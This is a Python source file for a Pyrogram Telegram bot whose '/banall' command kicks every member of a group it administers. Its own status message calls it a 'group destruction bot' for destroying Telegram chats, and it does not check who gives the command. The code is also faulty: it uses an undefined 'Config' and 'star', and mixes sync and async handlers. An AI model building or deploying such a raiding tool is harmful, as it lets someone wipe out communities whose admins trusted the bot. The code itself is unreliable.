import asyncio

from pyrogram import Client,filters, idle
from pyrogram.types import *
from config import config
import logging
from pyrogram.errors import (
    ChatAdminRequired
)

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

bot=Client(":memory:",api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,bot_token=Config.TELEGRAM_TOKEN)

SUDOS = Config.SUDOS







@bot.on_message(filters.command("banall") & filters.group)
def NewChat(bot,message):
    logging.info("new chat {}".format(message.chat.id))
    logging.info("getting memebers from {}".format(message.chat.id))
    a= bot.iter_chat_members(message.chat.id)
    for i in a:
        try:
            bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
            logging.info("kicked {} from {}".format(i.user.id,message.chat.id))
        except Exception:
            logging.info(" failed to kicked {} from {}".format(i.user.id,message.chat.id))
            
    logging.info("process completed")

@star.on_message(filters.command("alive"))
async def alive(bot, message):
    await message.reply("**Am Alive ❣️**\n\n𝙰 𝙶𝚁𝙾𝚄𝙿 𝙳𝙸𝚂𝚃𝚁𝚄𝙲𝚃𝙸𝙾𝙽 𝙱𝙾𝚃 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙿𝚈𝚁𝙾𝙶𝚁𝙰𝙼 𝙵𝙾𝚁 𝙳𝙸𝚂𝚃𝚁𝙾𝚈𝙸𝙽𝙶 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙲𝙷𝙰𝚃𝚂")


@bot.on_message(filters.command("start") & filters.private)
async def hello(bot, message):
    await message.reply("Hello, This Is Banall Bot I can Ban Members Within seconds!\n\n Simply Promote my By Adminstration then Type username")
